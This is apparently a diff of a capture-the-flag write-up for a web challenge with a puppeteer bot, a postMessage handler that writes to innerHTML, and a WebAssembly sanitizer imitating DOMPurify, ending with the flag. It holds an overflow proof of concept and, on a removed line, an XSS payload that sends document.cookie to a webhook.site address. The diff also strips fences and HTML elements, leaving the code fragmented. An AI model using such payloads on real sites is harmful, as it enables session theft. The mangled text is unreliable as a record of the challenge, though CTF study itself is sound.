@@ -32,11 +32,6 @@ $ tree .
 └── purify_206ec7c8d65c88cb617775a62bc5ab9bcfaa7baa.txz
 
 8 directories, 15 files
-```
-
-
-
-```
 #!/usr/bin/env node
 const puppeteer = require('puppeteer')
 
@@ -78,11 +73,6 @@ async function visit(url){
 }
 
 visit(JSON.parse(process.argv[2]))
-```
-
-
-
-```
 index.html
 <!DOCTYPE html>
 <html>
@@ -92,20 +82,15 @@ index.html
  <script src="./js/purify.js"></script>
  <link href="./css/style.css" rel="stylesheet"/>
 </head>
-<body>
-</body>
- <div>
+
+
+ 
  <h2>Received messages:</h2>
- <ul id="list">
- </ul>
- </div>
+ 
+ 
+ 
  <script src="./js/script.js"></script>
 </html>
-```
-
-
-
-```
 // script.js
 window.onmessage = e=>{
  list.innerHTML += `
@@ -114,11 +99,6 @@ window.onmessage = e=>{
 }
 
 setTimeout(_=>window.postMessage("hi",'*'),1000)
-```
-
-
-
-```
 // purify.js
 async function init() {
  window.wasm = (await WebAssembly.instantiateStreaming(
@@ -127,7 +107,7 @@ async function init() {
 }
 
 function sanitize(dirty) {
- wasm.set_mode(0) 
+ wasm.set_mode(0)
 
  for(let i=0;i<dirty.length;i++){
  wasm.add_char(dirty.charCodeAt(i))
@@ -142,17 +122,12 @@ function sanitize(dirty) {
  return clean
 }
 
-window.DOMPurify = { 
+window.DOMPurify = {
  sanitize,
  version: '1.3.7'
 }
 
 init()
-```
-
-
-
-```
 // clang --target=wasm32 -emit-llvm -c -S ./purify.c && llc -march=wasm32 -filetype=obj ./purify.ll && wasm-ld --no-entry --export-all -o purify.wasm purify.o
 struct globalVars {
  unsigned int len;
@@ -209,45 +184,25 @@ void set_mode(int mode) {
  g.is_dangerous = escape_tag;
  }
 }
-```
-
-
-
-```
 <script>
 let w = window.open('http://web');
 setTimeout(() => {
  w.postMessage('A'.repeat(0x1000) + '\x01<', '*');
 }, 100);
 </script>
-```
-
-
-
-```
 let c
  let clean = ''
  while((c = wasm.get_char()) != 0){
  clean += String.fromCharCode(c)
  }
-```
-
-
-
-```
 <script>
 let w = window.open('http://web');
 setTimeout(() => {
- w.postMessage("A".repeat(0x1000) + '\x01\x00\x00\x00' + '<img src=x onerror=location.assign([`http://webhook.site/…?`,document.cookie])>', '*');
+ w.postMessage("A".repeat(0x1000) + '\x01\x00\x00\x00' + '', '*');
  w.postMessage('a', '*');
  w.postMessage('a', '*');
  w.postMessage('a', '*');
 }, 100);
 </script>
-```
-
-
-
-```
 MAPNA{e22e0bf86e0813d9d3c7ae3f8022e41d}
 ```
